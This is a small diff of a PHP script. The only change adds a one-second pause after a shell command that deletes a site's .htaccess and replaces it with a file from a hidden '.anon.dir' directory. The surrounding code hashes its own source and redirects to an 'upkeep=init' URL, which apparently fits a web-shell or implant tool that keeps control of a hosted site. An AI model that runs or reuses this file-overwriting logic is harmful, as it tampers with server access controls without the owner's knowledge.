@@ -153,7 +153,7 @@
     $rs=spuf("https://$hn"); $rk=sha1(file_get_contents(__FILE__));
 
     if(strpos($rs,'500 Internal Server Error')||strpos($rs,'503 Service Unavailable')||strpos($rs,'<title>Index of /</title>'))
-    {$rs=bash("rm -f ./.htaccess && cp ./.anon.dir/Anon/base/access.cfg ./.htaccess");};
+    {$rs=bash("rm -f ./.htaccess && cp ./.anon.dir/Anon/base/access.cfg ./.htaccess"); sleep(1);};
 
     header("Location: https://$hn/?upkeep=init&rf=$fn&rk=$rk");
 
